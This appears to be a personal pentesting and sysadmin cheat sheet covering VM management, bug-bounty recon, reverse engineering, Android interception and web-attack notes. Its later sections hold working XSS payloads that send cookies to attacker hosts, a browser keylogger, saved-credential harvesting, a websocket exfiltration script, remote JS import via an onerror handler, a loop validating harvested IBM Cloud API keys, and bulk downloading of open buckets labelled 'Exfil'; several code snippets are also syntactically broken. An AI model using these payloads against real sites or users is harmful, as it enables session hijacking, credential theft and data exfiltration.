---
publish: True
title: Reference
---

# Commands for various things:

## virtual environment & management

### Virt os level
#### Upgrade everything
```
for i in `seq 1 3`; do apt update; apt upgrade -y; service snapd start; snap refresh; flatpak update -y; pip --disable-pip-version-check list --outdated --format=json | python -c "import json, sys; print('\n'.join([x['name'] for x in json.load(sys.stdin)]))" | xargs -n1 pip install -U --break-system-packages --root-user-action=ignore; pipx upgrade-all; npm update -g; /root/go/bin/pdtm -ia; /root/go/bin/pdtm -ua; rustup update; for c in `cargo install --list|cut -sd' ' -f1`; do cargo install $c; done; done
```
#### Find domains that resolve to local ips

```
subfinder -rl 50 -all -silent -d lb.appdomain.cloud > /tmp/subdomains; for i in `cat /tmp/subdomains`; do dig +all $i |grep -i "IN A\|DIG "| grep -B1 -iE "(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.1[6789]\.\.[0-9]{1,3}\.[0-9]{1,3}|172\.2[0-9]\.|172\.3[01]\.\.[0-9]{1,3}\.[0-9]{1,3})"; done |grep -i "+all" |awk '{print $7}'
```
#### Added memory because memory

```
dd if=/dev/zero of=/swapfile bs=1GB count=40
mkswap /swapfile
swapon /swapfile
```

#### better ip output
```
ip -br -c a
```
### Host level

#### Start local python server (to pull isos, instead of from other location)

```
tmux new-session -s webserver -d "python3 -m http.server --directory=/share/vms/"
```

#### Create VM

```
papermill /automation-tools/libvirt-provision.ipynb /dev/stdout -p hostname ubuntu -p domainname private -p url http://10.42.0.1:8000/noble-server-cloudimg-amd64.img -p os_variant ubuntu-stable-latest -p size 40G -p ram 2048
```

#### Power on all stopped vms

```
for i in `virsh list --all|grep -i off|awk '{print $2}'`; do virsh start $i; done
```

#### Stop and remove all vms

```
for i in `virsh list --all|grep -i .private|awk '{print $2}'`; do tmux new-session -d "virsh destroy $i; sleep 300; virsh undefine $i --remove-all-storage"; done 2>/dev/null
```

#### Start local python server (to pull isos, instead of from other location)

```
tmux new-session -s webserver -d "python3 -m http.server --directory=/share/vms/images"
```

#### deb repo 
```
cp -R /var/cache/apt/archives/* /share/vms/images/debs/
dpkg-scanpackages /share/vms/images/debs/ /dev/null | gzip -9c > /share/vms/images/debs/Packages.gz
```

#### uptime check & network validation

```
nmap -sS -p22 --open -Pn -n `ip address show dev $(virsh net-info default|grep -i bridge |awk '{print $2}')|grep -i inet|awk '{print $2}'`|grep -i "report for" |awk '{print $5}' > /tmp/virtnmap; for i in `cat /tmp/virtnmap`; do ssh-keyscan -H $i > ~/.ssh/known_hosts 2>/dev/null; ansible $i -i /tmp/virtnmap -a "uptime" -T 30 -u ansible -b; done
```

#### Watch vm lists

```
watch "echo '\nTMUX SESSIONS:\n';tmux list-sessions; echo '\nVMS:\n'; virsh list --all|grep -i private; echo '\nIP ADDRESSES:\n'; virsh net-dhcp-leases default|grep -owE '[0-9.]{7,20}'"
```

#### nmcli hotspot
```
nmcli dev wifi hotspot ifname wlan1 ssid testmeta password metatest
nmcli con add type ethernet ifname eth0 ipv4.method shared con-name "internetShare"
```

#### nmcli connection modify
```
nmcli connection modify "MyConnection" connection.interface-name eth0
```

## pentesting & forensics

### Bounty Targets
```
git clone https://github.com/arkadiyt/bounty-targets-data
pdtm -ia; pdtm -ua; for i in `grep -Eoh "(([a-zA-Z](-?[a-zA-Z0-9])*)\.)+[a-zA-Z]{2,}" bounty-targets-data/data*.txt|sort -u`; do subfinder  -max-time 100 -silent -recursive -active -d $i |katana -hl -silent -nos -xhr -d 50  -jc -jsl -kf -ns -user-agent "" >> scrape-$i-log; done
for i in `sort -u bounty-targets-data/data/domains.txt|grep -iE ".{3,}" `; do echo `docker run -it --rm -v $PWD/:/app/results waymore:latest waymore -i $i  -oU $i.links -oR /app/results/$i/`; done
awk -F "," '{print $2}' */waymore_index.txt|awk -F "//" '{$1=$2=""; print $0}'|sed s/" "/"\/"/g|sed s/"\/\/"//g|sed s/"\/$"//g|sort -u
grep -hEo "(http|https)://[a-zA-Z0-9./?=_%:-]*" scrape-*-log|sed s/"%5C$"//g|sed s/"%5C%5C$"//g|sort -u
```
#### Javascript Deobfuscate

```
docker run -d --rm --name jsdetox -p 3000:3000 docker.io/remnux/jsdetox

docker run -d --rm -p 4000:4000 -p 35729:35729 --name docker.io/de4js remnux/de4js

https://tungcsv.github.io/de4js/

```

#### JWT

```
docker run -it --network "host" --rm -v "${PWD}:/tmp" -v "${HOME}/.jwt_tool:/root/.jwt_tool" docker.io/ticarpi/jwt_tool
```

#### Binwalk extract everything
```
binwalk --dd='.*' --run-as=root /root/resources.arsc
```

#### Bucket Search AWS
```
aws s3 ls --no-sign-request --recursive s3://cf-courses-data/ --endpoint-url=https://s3.us.cloud-object-storage.appdomain.cloud
aws s3 sync --no-sign-request --recursive s3://cf-courses-data/ --endpoint-url=https://s3.us.cloud-object-storage.appdomain.cloud .
aws configure --profile whatever
aws s3 ls s3://whatever --profile whatever
```

#### firebase enum
```
git clone https://github.com/Sambal0x/firebaseEnum
./firebaseenum.py -k searchterm
```

#### smtp server

```
python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

#### Iptables for zap/burp

```

iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080; iptables -t nat -I PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080;

```

#### Run initial scan

```
/share/public-git-repos/automation-tools/sanitize.sh; papermill --stdout-file /tmp/initial-scan.output /share/public-git-repos/automation-tools/initial-scans.ipynb /tmp/initial-scan.json -p input_data 10.13.37.14
```

#### Caido Docker

```
podman run --rm -p 8080:8080 --userns=keep-id -v /caido:/home/caido/.local/share/caido -m 2g --memory-swap 2g docker.io/caido/caido:latest
```

#### unknown ciphers / encryption:

```

podman run -it --rm docker.io/remnux/ciphey {text}

```

#### chrome driver with listening port

```

tmux new-session -d "chromedriver --port=4444 --disable-dev-shm-usage"

```
#### scan for and validate ibmcloud apikeys (bash version)

```
for apikey in `grep -iroEh "([a-zA-Z0-9]{28,40}[_-][a-zA-Z0-9]{4,15})" /tmp/truffle* 2>/dev/null`; do token=`curl https://iam.cloud.ibm.com/identity/token -X POST -d "apikey=$apikey&grant_type=urn%3Aibm%3Aparams%3Aoauth%3Agrant-type%3Aapikey&response_type=cloud_iam" -s|grep -i access_token|awk -F '"' '{print $4}'`; curl -s -X GET https://iam.cloud.ibm.com/v1/apikeys -H "Authorization: Bearer $token"|jq '.apikeys[]|.id' 2>/dev/null; done
```

#### API Testing
```
github.com/yogsec/API-Pentesting-Tools
```

#### Buckets by provider:
```
ibm: s3.(region).cloud-object-storage.appdomain.cloud
aws: s3.amazonaws.com
digitalocean: (region).digitaloceanspaces.com
google: storage.googleapis.com
```
#### Exfil open buckets
```
domain=s3domain; /root/.pdtm/go/bin/pdtm -ia; /root/.pdtm/go/bin/pdtm -ua ;for i in `subfinder -max-time 100 -silent -recursive -d $domain |awk -F "\.$domain" '{print $1}' |sort -u`; do mkdir $i && cd $i && aws s3 sync --no-sign-request s3://$i/ --endpoint-url=https://$domain . ; cd /share/pentests/bugbounty/ibm/alternative-bucket/yetanother/; done; find . -type d -empty -delete
```

#### pixelation
```sh
python3 depix.py \
    -p /path/to/your/input/image.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /path/to/your/output.png
```
## Ansible

### password change without exposing password to process list on ansible managed node

```
ansible-playbook -i localhost, ../othertools/ansible/change-shadow.yaml -u ansible -b --become-password-file /root/becomefile -e user=root -e "pass=$(openssl passwd -6 passwd)"
```


### Run keycloak
```
mkdir /volume1/Data/keycloak; docker run --name keycloak -v /volume1/Data/keycloak:/opt/keycloak  -p 8080:8080 -e KC_BOOTSTRAP_ADMIN_USERNAME=user -e KC_BOOTSTRAP_ADMIN_PASSWORD=password quay.io/keycloak/keycloak:26.1.3 start-dev
```

#### Run jenkins & gogs
```
ansible-playbook -i storage, ../../Notes/Obsidian/RandomDocs/RandomDocs/Ansible/Ansible-Docker-devops/jenkins-gogs.yml -u user -e ansible_python_interpreter=/bin/python -K
```

##### jenkins-gogs.yml
```
---
- hosts: all
  gather_facts: yes
  become: yes
  vars:
   ansible_host_key_checking: false
   ansible_ssh_timeout: 300
  tasks:
   - name: Create jenkins dir
     ansible.builtin.file:
      path: /volume1/Data/jenkins
      state: directory
      mode: '777'
   - name: Create gogs dir
     ansible.builtin.file:
      path: /volume1/Data/gogs
      state: directory
      mode: '777'
   - name: start jenkins
     ansible.builtin.command:
      cmd: /usr/local/bin/docker run --name jenkins-dev --rm -p 7080:8080 -v /volume1/Data/jenkins:/var/jenkins_home jenkins/jenkins:lts
     async: 30
     poll: 0
     register: jenkinstask
   - name: start gogs
     ansible.builtin.command:
      cmd: /usr/local/bin/docker run --rm --name gogs -p 7022:22 -p 10880:3000 -v /volume1/Data/gogs:/data gogs/gogs
     async: 30
     poll: 0
     register: gogstask
   - name: wait for jenkins task
     ansible.builtin.async_status:
      jid: "{{ jenkinstask.ansible_job_id }}"
     until: job_result.finished
     register: job_result
     retries: 300
     delay: 300
   - name: wait for gogs task
     ansible.builtin.async_status:
      jid: "{{ gogstask.ansible_job_id }}"
     until: job_result.finished
     register: job_result
     retries: 300
     delay: 300
   - name: start get jenkins password
     ansible.builtin.command:
      cmd: /usr/local/bin/docker exec jenkins-dev cat /var/jenkins_home/secrets/initialAdminPassword
      register: jenkinsPass
   - name: print pass
     debug:
      msg: "{{ jenkinsPass.stdout }}"
```

#### Run homepage
```
docker run -p 3333:3333 -e HOMEPAGE_ALLOWED_HOSTS=familystorage -v /volume1/Data/homepage:/app/config -v /var/run/docker.sock:/var/run/docker.sock ghcr.io/gethomepage/homepage:latest
```

#### nmap-inv.yml
```
---
plugin: community.general.nmap
strict: false
ipv4: true
ports: true
sudo: true
port: 22,80,8080,443,8443
address: 172.18.0.1/24
groups:
 ssh_server: "ports | selectattr('service', 'equalto', 'ssh')"
 web_servers: "ports | selectattr('service', 'equalto', 'http'"

```
## Reversing things

Find main based on last ret to libc

```
look for libc startup -> find last call made that returns something to eax -> that's main, in libc stuff. 
```

shellcode quick analysis
```
scdbg /f out.bin -s -1 (parse all from out.bin)
```

Choco:
```
choco upgrade all -y -force
choco list --local-only
choco install PACKAGENAME -y
choco install packer vagrant virtualbox git poshgit chefdk visualstudiocode -y
choco install github --ignore-checksums
choco outdated
```

### Rizin

#### helpful stuff
```
dso; drr; pd 10 # ds = debug step, dso = debug step over, dr is debug register, drr is debug register with additional context, pd is print dump with a specifer (10) of how many steps to print in the disassembler
# Information about the binary file
> i
# All summary
> ia
# Show main address
> iM
# Symbols
is
# List strings
> iz
# List strings in whole binary
> izz
# Reopen current file in debug mode 
> ood
# Disassemble at current address
> pd
# Disassemble 10 instructions at current address
> pd 10
# Disassemble all possible opcodes at current address
> pda
# Disassemble all possible opcodes 10 instructions at current address
> pda 10
# Disassemble at the given function
> pd @ main
> pd 20 @ main
# Disassemble a function at current address
> pdf
# Disassemble at given address
> pdf @ 0x401005
# Disassemble the main function
> pdf @ main
# Print string
> ps @ 0x2100
# Print zero-terminated string
> psz @0x2100
# Show 200 hex bytes
> px 200
# Show hex bytes at given register
> px @ eip
> px @ esp
# Print current address
> s
# Seek to given function
> s main
> s sym.main
# Seek to given address
> s 0x1360
> s 0x0x00001360
# Seek to register address
> s esp
> s esp+0x40
> s rsp
> s rsp+0x40
# Seek 8 positions
> sd 8
# Show the seek history
> sh
# Undoing
> shu
# Redoing
> shr
# Step
> ds
# Step 3 times
> ds 3
# Step back
> dsb
# Setup a breakpoint
> db @ 0x8048920
# Remove a breakpoint
> db @ -0x8048920
# Remove all breakpoints
> db-*
# List all breakpoints
> dbl
# Continue to execute the program until we hit the breakpoint
> dc
# Continue until syscall
> dcs
# Read all registers values
> dr
> dr=
# Read given register value
> dr eip
> dr rip
# Set a register value
> dr eax=24
# Show register references
> drr
# Analyze all calls
> aaa
# Analyze function
> af 
# List all functions
> afl
> afl | grep main
# Show address of current function
> afo
```
#### running 1
```
[0x7ffad20914d0]> afl |findstr Main
0x004014d0    1 34           dbg.WinMainCRTStartup
0x00435a21    1 45           sym.PreMainInner
0x00435a4e    1 109          sym.PreMain
0x00435abb    1 20           sym.NimMainInner
0x00435acf    1 49           sym.NimMain
0x00435b55   34 1480         sym.NimMainModule
[0x7ffad20914d0]> db @ 0x00435b55
[0x7ffad20914d0]> dc #initial startup
[0x7ffad20fc47a]> dbl # list breakpoints
     start        end size perm hwsw type  state   valid cmd cond name              module
-------------------------------------------------------------------------------------------
0x00435b55 0x00435b56    1 --x  sw   break enabled valid          sym.NimMainModule
[0x7ffad20fc47a]> dc # continue until break point
hit breakpoint at: 0x435b55 # just before break point ??
[0x00435b55]> afl |findstr dns
0x00429635   16 2826         sym.dnsclient_typesDatInit000
0x0042c608    1 3599         sym.dnsclient_recordsDatInit000
0x00430f93    1 92           sym.dnsclient_protocolInit000
0x00431f91    1 370          sym.dnsclient_dnsclientDatInit000
[0x00435b55]> db @ 0x00429635
[0x00435b55]> dc

==> Process finished  # So basically, this never went to that dnsclient, maybe i can try the other ones, or maybe something is broken before that.
(restarted and re-analyzed)
[0x7ffad20914d0]> afl |findstr dns
0x00429635   16 2826         sym.dnsclient_typesDatInit000
0x0042c608    1 3599         sym.dnsclient_recordsDatInit000
0x00430f93    1 92           sym.dnsclient_protocolInit000
0x00431f91    1 370          sym.dnsclient_dnsclientDatInit000
[0x7ffad20914d0]> db @ 0x00429635
[0x7ffad20914d0]> db @ 0x0042c608
[0x7ffad20914d0]> db @ 0x00430f93
[0x7ffad20914d0]> db @ 0x00431f91
[0x7ffad20fc47a]> dc
hit breakpoint at: 0x429635
[0x00429635]> dbl
     start        end size perm hwsw type  state   valid cmd cond name                              module
-----------------------------------------------------------------------------------------------------------
0x00429635 0x00429636    1 --x  sw   break enabled valid          sym.dnsclient_typesDatInit000
0x0042c608 0x0042c609    1 --x  sw   break enabled valid          sym.dnsclient_recordsDatInit000
0x00430f93 0x00430f94    1 --x  sw   break enabled valid          sym.dnsclient_protocolInit000
0x00431f91 0x00431f92    1 --x  sw   break enabled valid          sym.dnsclient_dnsclientDatInit000
[0x00429635]> pdf
            ; CALL XREF from sym.PreMain @ 0x435a9f
            ;-- rip: 
┌ sym.dnsclient_typesDatInit000();
[0x00429635]> drr
role reg    value    refstr
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
     mxcsr  0x1f80   8064
     rflags 0x204    516 data.00000204,rflags
R0   rax    0x45b500 4568320 .bss rax
A0   rcx    0x446e00 4484608 IMAGE    nsex.exe | .bss .bss rcx ascii ('R W 0x1
A1   rdx    0x42638d 4350861 IMAGE    nsex.exe | .text .text Marker_tyRef__OhBa09cfBAnY4MdnNlGabWQ,rdx sym.Marker_tyRef__OhBa09cfBAnY4MdnNlGabWQ R X 'push rbp' 'IMAGE    nsex.exe | .text'
     rbx    0x1      1 rbx,r12
SP   rsp    0x67fda8 6815144 PRIVATE   rsp R W 0x435aa4
BP   rbp    0x67fde0 6815200 PRIVATE   rbp R W 0x67fe20
     rsi    0x2a     42 rsi ascii ('*')
     rdi    0xc61570 12981616 PRIVATE   rdi R W 0xc61580
A2   r8     0x19c    412 data.0000019c,r8,r9,r10,r11
A3   r9     0x19c    412 data.0000019c,r8,r9,r10,r11
     r10    0x19c    412 data.0000019c,r8,r9,r10,r11
     r11    0x19c    412 data.0000019c,r8,r9,r10,r11
     r12    0x1      1 rbx,r12
     r13    0x8      8 r13
     r14    0x0      0
     r15    0x0      0
PC   rip    0x429635 4363829 IMAGE    nsex.exe | .text .text dnsclient_typesDatInit000,rip sym.dnsclient_typesDatInit000 R X 'push rbp' 'IMAGE    nsex.exe | .text'
[0x00429635]> psw @ 0x42638d
䡕\xee\x96\x89荈レ襈၍襈ᡕ譈၅襈\xef\xa1\x85譈\xef\xa1\x85譈ࡀ譈ᡕ襈\xee\xa3\x81諶\xfe\xff譈\xef\xa1\x85譈ᡀ譈ᡕ襈\xee\xa3\x81諢\xfe\xff譈\xef\xa1\x85譈⁀譈ᡕ襈\xee\xa3\x81諎\xfe\xff譈\xef\xa1\x85譈⡀譈ᡕ襈\xee\xa3\x81誺\xfe\xff䢐쒃崰嗃襈䣥֍兹\x03읈저\x0f䠀֍八\x03읈ࡀ\x08
[0x0042c608]> db @ sym.NimMainModule
[0x0042c608]> dbl
     start        end size perm hwsw type  state   valid cmd cond name                              module
-----------------------------------------------------------------------------------------------------------
0x00429635 0x00429636    1 --x  sw   break enabled valid          sym.dnsclient_typesDatInit000
0x0042c608 0x0042c609    1 --x  sw   break enabled valid          sym.dnsclient_recordsDatInit000
0x00430f93 0x00430f94    1 --x  sw   break enabled valid          sym.dnsclient_protocolInit000
0x00431f91 0x00431f92    1 --x  sw   break enabled valid          sym.dnsclient_dnsclientDatInit000
0x00435b55 0x00435b56    1 --x  sw   break enabled valid          sym.NimMainModule
[0x00431f91]> dc
hit breakpoint at: 0x431f91
[0x00431f91]> dbl
     start        end size perm hwsw type  state   valid cmd cond name                              module
-----------------------------------------------------------------------------------------------------------
0x00429635 0x00429636    1 --x  sw   break enabled valid          sym.dnsclient_typesDatInit000
0x0042c608 0x0042c609    1 --x  sw   break enabled valid          sym.dnsclient_recordsDatInit000
0x00430f93 0x00430f94    1 --x  sw   break enabled valid          sym.dnsclient_protocolInit000
0x00431f91 0x00431f92    1 --x  sw   break enabled valid          sym.dnsclient_dnsclientDatInit000
0x00435b55 0x00435b56    1 --x  sw   break enabled valid          sym.NimMainModule
[0x00431f91]> dc
WARNING: A second-chance exception has ocurred!



pdf
...
│     ││╎   0x0043283f      mov   qword [var_88h], 0x10                ; r8
│     ││╎   0x00432847      lea   rax, str.usr_local_src_hello.nim     ; 0x43c689 ; "/usr/local/src/hello.nim"
│     ││╎   0x0043284e      mov   qword [var_80h], rax
│     ││╎   0x00432852      mov   rdx, qword [var_50h]
│     ││╎   0x00432856      mov   rax, qword [var_40h]
│     ││╎   0x0043285a      lea   rcx, data.00000248
│     ││╎   0x00432861      mov   qword [var_data.00000268], rcx
│     ││╎   0x00432866      mov   r9d, data.000001f4                   ; 0x1f4
│     ││╎   0x0043286c      mov   r8d, 0x10
│     ││╎   0x00432872      mov   rcx, rax
│     ││╎   ;-- rip:
│     ││╎   0x00432875 b    call  sym.sendQuery__CX1XXfck9ba9cJqPY29bYVNeQ ; sym.sendQuery__CX1XXfck9ba9cJqPY29bYVNeQ
...
[0x0043286c]> drr; pd 22
role reg    value    refstr
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
     mxcsr  0x1f80   8064
     rflags 0x204    516 data.00000204,rflags
R0   rax    0xa00d10 10489104 PRIVATE   rax,rcx R W 0x459c00
A0   rcx    0xa00d10 10489104 PRIVATE   rax,rcx R W 0x459c00
A1   rdx    0xa0c520 10536224 PRIVATE   rdx R W 0x42
     rbx    0x1      1 rbx,r12
SP   rsp    0x67f600 6813184 PRIVATE   rsp R W 0x67f640
BP   rbp    0x67f880 6813824 PRIVATE   rbp R W 0x67fdb0
     rsi    0x9      9 rsi
     rdi    0x6b1570 7017840 PRIVATE   rdi R W 0x6b1580
A2   r8     0x10     16 r8
A3   r9     0x1f4    500 data.000001f4,r9
     r10    0x0      0
     r11    0xa0c563 10536291 PRIVATE   r11 R W 0x7473616f2e736139 9as.oast.online
     r12    0x1      1 rbx,r12
     r13    0x8      8 r13
     r14    0x0      0
     r15    0x0      0
PC   rip    0x432875 4401269 IMAGE    nsex.exe | .text .text rip sym.nsex__eP2ttPkowx6uCkozS0R9aVQ ascii ('u') R X 'call 0x42f578' 'IMAGE    nsex.exe | .text'

[0x0043286c]> psi @ 0xa0c563
9as.oast.online
[0x0043286c]> psi @ 0xa00d10
8.8.8.8
[0x0043286c]> psi @ 0xa0c520
IERPIE5PVCBFRElUIFRI.d0bppvukuj25s86t4750nn63j5i3a19as.oast.online
[0x0043286c]> psi @ 0x6b1570
nsex.exe

```

#### running 2
```
[0x0043e060]> pdf|grep -i softlayer -B1 # listing current function (sym.go.runtime.main)
│      │╎   0x0043e0fe      lea   rcx, [0x019423a0]
│      │╎   ; DATA XREF from sym.go.github.com_softlayer_softlayer_go_services.Location_Datacenter.GetLocationStatus @ 0x854af4
--
│    │││╎   0x0043e134      cmp   dword [0x019a2f40], 0                ; [0x19a2f40:4]=0
│    │││╎   ; DATA XREF from sym.go.github.com_softlayer_softlayer_go_services.Network_Storage.RemoveAccessToReplicantFromVirtualGuestList @ 0x87837e
--
│ ││││││╎   0x0043e2ed      mov   rax, qword [data.0126bd10]           ; [0x126bd10:8]=0xc3f000 sym.go.main.main
│ ││││││╎   ; DATA XREF from sym.go.github.ibm.com_SoftLayer_softlayer_cli_plugin_managers.userManager.GetHardware @ 0xa09285
--
│ ││ │││╎   0x0043e31d      sub   rsp, 0xffffffffffffff80
│ ││ │││╎   ; DATA XREF from sym.go.github.ibm.com_SoftLayer_softlayer_cli_plugin_managers.FindVolumePricesUpgrade @ 0x9ff258
[0x0043e060]> agc > /tmp/maincallgraph
[0x0043e060]> afl |grep -i search|wc -l
51
## Decided to scope over to the search features because that's the command line I used
[0x004725e0]> db @@F ~softlayer_cli_plugin_commands_search

https://github.com/miekg/dns/issues/1384
```
## Dev

### Go

#### plugins
First off, you can't use regular elfs as go plugins. But, it seems, there isn't inherently a checker built into the plugins thing yet that prohibits all other elfs (https://cs.opensource.google/go/go/+/refs/tags/go1.24.2:src/plugin/plugin_dlopen.go;l=69)

```
┌──(root㉿kp2323)-[/share/git-repo/Scripts/gotest/plugintest]
└─# cat main.go|grep -i plugin   
        "plugin"
        // Open the plugin
        plug, err := plugin.Open("../../../../../../../../../bin/bash")
            log.Fatalf("Can't open plugin: %v", err)
        // Call the function from the plugin
       // Access the variable from the plugin
        fmt.Println("Plugin Version:", *versionVar)
                                                                                                                
┌──(root㉿kp2323)-[/share/git-repo/Scripts/gotest/plugintest]
└─# go run main.go            
2025/05/01 15:05:05 Can't open plugin: plugin.Open("../../../../../../../../../bin/bash"): /usr/bin/bash: cannot dynamically load position-independent executable
exit status 1
```

### nim

#### docker compile
```
docker run --rm -v `pwd`:/usr/local/src chrishellerappsian/docker-nim-cross:latest bash -c "nimble install -y  dnsclient; nim c --os:windows --cpu:amd64 --out:nsex.exe hello.nim"
```

#### related projects
```
offensivenim
nimcrypt2
nimplant
nimpackt
dinvoke -> nim_dinvoke
nimfilt
```
### rust

#### create txt request
```
use trust_dns_resolver::error::ResolveResult;
use trust_dns_resolver::Resolver;
use trust_dns_resolver::{config::*, lookup::TxtLookup}

fn main(){
let resolver = Resolver::new(ResolverConfig::default(), ResolverOpts::default()).unwrap();
let txt_respons = resolver.txt_lookup("whatever.whatever.tld");
display_txt(&txt_response);_
}
fn display_txt(txt_response: &ResolveResult<TxtLookup){
match txt_response{
Err(_)=>println!("No TXT Records"),
Ok(txt_response)=>{
let mut i = 1;
for record in txt_response.iter(){
println!("TXT Record {}:", i);
println!("{}" record.to_string());
println!("");
i=i+1
}
}
}
}
```

#### base64
```
use base64::prelude::*;
let input=b'whatever'
let encoded=BASE64_STANDARD.encode(input);
```

#### reading a file
```
use std::env;
use std::fs;
fn main(){
println!("in file {file_path}");
let contents=fs::read_to_string(file_path).expect("you should have been able to read the file!);
println!("With text:\n{contents}")
}
```

#### home dir
```
usr std::env;
match env::home_dir(){
Some(path)=>println!("your home directory {}", path.display()), None=>println!("impossible to get your home dir"),
}
```
### pyscript

#### Just some testing, to understand it
```
<div w3-include-html="https://ferasdour.pyscriptapps.com/silent-math/latest/?url=https://ffpi86cvy1zmtg0bs49m3ki72w1t4pbc9.oast.site"></div>
```

```
<script src='https://ferasdour.pyscriptapps.com/silent-math/latest/whatever.js'></script>
```

```
<img src="xsspoc" onerror="import('https://ferasdour.pyscriptapps.com/evil-poc-dont-use/latest/whatever.js');">
```

More info on this is over here: https://pyscript.com/@ferasdour/evil-poc-dont-use/latest?files=README.md ,  https://github.com/ferasdour/other-nonsense , and https://feemcotech.blogspot.com/2025/05/pyscript-nim-aaaaand-go.html
### Quick devops spinup
```
mkdir /volume1/Data/jenkins
docker run -p 10080:8080 -v /volume1/Data/jenkins:/var/jenkins_home jenkins/jenkins:lts
mkdir /volume1/Data/gogs
docker run --name=gogs -p 10022:22 -p 10880:3000 -v /var/gogs:/data gogs/gogs
```

### Android
#### Install from apk
```
PS C:\Users\no_ne\Desktop> ..\appdata\Local\Android\Sdk\platform-tools\adb.exe install metaview.apk  
```
#### Install CA
```
openssl x509 -inform PEM -subject_hash_old -in ca-docker.crt|head -n 1 
ce01745e
openssl x509 -in ca-docker.crt -inform PEM -outform DER -out ce01745e.0
# on adb system
..\appdata\Local\Android\Sdk\platform-tools\adb.exe push .\certs\ce01745e.0 /data/misc/user/0/cacerts-added/ce01745e.0
..\appdata\Local\Android\Sdk\platform-tools\adb shell "su 0 chmod 644 /data/misc/user/0/cacerts-added/ce01745e.0"     
..\appdata\Local\Android\Sdk\platform-tools\adb reboot  
```

#### Install Frida
```
unxz frida-server.xz
adb root
..\appdata\Local\Android\Sdk\platform-tools\adb push .\frida-server-16.6.6-android-x86_64 /data/local/tmp/
..\appdata\Local\Android\Sdk\platform-tools\adb shell "chmod 755 /data/local/tmp/frida-server-16.6.6-android-x86_64
 ..\appdata\Local\Android\Sdk\platform-tools\adb shell "chmod 755 /data/local/tmp/frida-server-16.6.6-android-x86_64"
 ..\appdata\Local\Android\Sdk\platform-tools\adb shell "/data/local/tmp/frida-server-16.6.6-android-x86_64 &"  
```

#### Adb networked
```
taskkill /f /t /im adb.exe
.\adb.exe -a nodaemon server
```

### javascript (mostly from tcm's course)

#### understanding notes
apis:
- requests:
	- fetch
		- fetch("https://google.com")
		- xmlhttp
		- let xhr = new XMLHttpRequest(); xrh.open('GET','https://google.com',true); xhr.send('email=update@email.com')

#### Stealing Cookies:

```
<img src="http://10.10.14.13?c='+document.cookie+'"/>

<img src=x onerror='fetch("http://cvo169ukuj238mr1ikegi59khk1ww9rzc.oast.site/?auth="+document.cookie)';/>

fetch("http://locahost/?c="+document.cookie);

```

#### Accessing storage:

```
let localStorageData=JSON.stringify(localStorage)
let sessionStorageData=JSON.stringify(sessionStorage)
```

#### Saved Creds (autofill and export):

```
// create the input elements
let userField=document.createElement('input');
userField.Type="text";
UserField.name="username";
UserField.id="username";
let passField = document.createElement('input');
passField.type="password";
passField.name="password";
passField.id="password";
// append the elements tot he body of the page
document.body.appendChild(userField);
document.body.appendChild(passField);
// exfiltrate as needed
setTimeout(function(){
    console.log("Username:", document.getElementById("username").value);
    console.log("Username:", document.getElementById("username").value);
}, 1000);
```

#### Session Riding:

```
let xhr = new XMLHttpRequest();
xhr.open('POST','http://localhost/updateprofile',true);
xhr.setRequestHeader('Content-type'.'application/x-www-form-urlencoded');
xhr.send('?email=update@email.com');
```

#### Keylogger:

```
document.onkeypress=function(e){
    get=window.event ? event: e;
    key=get.keyCode ? get.keyCode : get.charCode;
    key=String.fromCharCode(key);
    console.log(key);
}
```

#### example using this to get admin:

```
<script>fetch('https://10.10.14.13/',{method: 'POST', mode: 'no-cors', body: document.cookie,});</script>
```

#### Websocket example:

```
<script>
var ws=new Websocket('wss://target.local/page');
ws.onopen=function(){ws.send("READY");}
ws.onmessage=function (event) {fetch('https://colab-payload.local',{method:"POST",mode:"no-cors",body:event.data});}
</script>
```

#### Port scanning (defanged example):

```
const listing=[];listing.forEach((domain) => {Array.from(["80","8080","443","8443","10000","22","2222","88","5789"]).forEach(port => {try{fetch('http://'+domain+':'+port,{method: 'POST', mode: 'no-cors',body: document.cookie,}).then(data => {obj = data;});fetch('WHATEVER',{method: 'POST', mode: 'no-cors', body: obj,}); new Promise(r => setTimeout(r, 2000));} catch(error){}});});
```

#### launch powershell web

```
opening folders with explorer but choosing powershell, lauches powershell
.
old ways
https://devblogs.microsoft.com/scripting/how-can-i-start-windows-explorer-opened-to-a-specific-folder/
Maybe - 
objShell.BrowseForFolder _ (WINDOW_HANDLE, “Select a folder:”, NO_OPTIONS, "powershell -iex 'start cmd.exe'")
.
https://learn.microsoft.com/en-us/windows/win32/shell/shell-browseforfolder
(activex objects in javascript don't work anymore except for ie and such so might have to rely on vbs or wasm)
.
This has apparently been a thing for a while
https://stackoverflow.com/questions/33746534/vbscript-open-folder-in-same-explorer-window
.
Here's an example where they also add to make it send enter to forward it:
Set WshShell = WScript.CreateObject("WScript.Shell")
target = "powershell -iex 'start cmd.exe'"
WshShell.SendKeys "%d"
WshShell.SendKeys target
WshShell.SendKeys "{ENTER}"
.
remote share by specifically launching wscript.shell.run:
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "Explorer " & "\\MachineName\Path\", 1, false
wscript.Sleep 10000
WshShell.Run "Explorer " & "C:\Users\UserName\Desktop", 1, false
.
None of those work outside of ie context, or some cases with edge (chromium)
.
https://developer.mozilla.org/en-US/docs/Web/API/Navigator/share#examples
web share api seems to have a file option
.
https://developer.mozilla.org/en-US/docs/Web/API/File/File
.
example (unrelated) of file use
const file = new File(["https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online"], "foo.lnk", {type: "text/uri-list",});
await navigator.share({file, title: "test", text: "test", url: ''});
await navigator.share({title: 'test',text: 'test',url: 'https://d016rj6kuj25cl9fe7l0bykqdyuotcn98.oast.online',});
# click the button by default
document.getElementsByTagName('button')[0].click();
# example javascript
      let shareData = {
        title: 'MDN',
        text: 'Learn web development on MDN!',
